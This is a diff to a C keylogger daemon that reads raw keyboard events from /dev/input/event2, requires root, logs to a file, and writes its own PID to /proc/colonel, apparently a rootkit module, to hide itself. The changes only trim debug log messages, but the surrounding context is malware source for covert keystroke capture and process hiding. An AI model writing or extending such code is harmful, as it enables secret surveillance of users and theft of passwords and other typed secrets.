@@ -59,7 +59,7 @@ int main(void) {
 	fp = fopen("./col_log/log.txt", "a+"); 					                       /* daemon log */
 	fd = open("/dev/input/event2", O_RDONLY);			                           /* key event file */
 	ftty = open("/proc/colonel", O_WRONLY);					/* open for write to hide keylogger pid */
-    fprintf(fp, "I'M AWAKE!!! -- listening: %d, toggle: %s", listening, toggle);
+    fprintf(fp, "I'M AWAKE!!! -- listening: %d", listening);
 	time_t curtime;
 	time(&curtime);
 
@@ -69,9 +69,9 @@ int main(void) {
 	sprintf(dpid, "hp%jd", (intmax_t)child_pid);			                 /* forms command */
 	write(ftty, dpid, sizeof(dpid));						                 /* passes command to the colonel */
 	fprintf(fp, "PID: %jd -- %s", (intmax_t)child_pid, ctime(&curtime));     /* records current pid to log */
-    fprintf(fp, "WHY AM I DYING? -- listening: %d, toggle: %s", listening, toggle);
+    fprintf(fp, "WHY AM I DYING? -- listening: %d", listening);
 	close(ftty);
-	fprintf(fp, "NO ERRORS FOR YOU! -- listening: %d, toggle: %s", listening, toggle);
+	fprintf(fp, "NO ERRORS FOR YOU! -- listening: %d", listening);
 	if (!ftty) {
 		fprintf(fp, "ERROR: /proc/colonel not found -- %s", ctime(&curtime));
 		return 1;
@@ -79,12 +79,12 @@ int main(void) {
 	// findev = open('/proc/bus/input/devices', O_RDONLY);
 /*
 * DYNAMICALLY DISCOVER CORRECT EVENT (/proc/bus/input/devices) 327
-*/	fprintf(fp, "NOT ROOT! -- listening: %d, toggle: %s", listening, toggle);
+*/	fprintf(fp, "NOT ROOT! -- listening: %d", listening);
 	if (geteuid() != 0) {									                 /* check if user is root */
 		fprintf(fp, "ERROR: user not root -- %s", ctime(&curtime));
 		return 1;
 	}
-    fprintf(fp, "JUST KIDDING, NOT WHILE -- listening: %d, toggle: %s", listening, toggle);
+    fprintf(fp, "JUST KIDDING, NOT WHILE -- listening: %d", listening);
 	while(1) {				
 		fflush(fp);
 		read(fd, &ev, sizeof(struct input_event));			                  /* read from /dev/input/eventX */
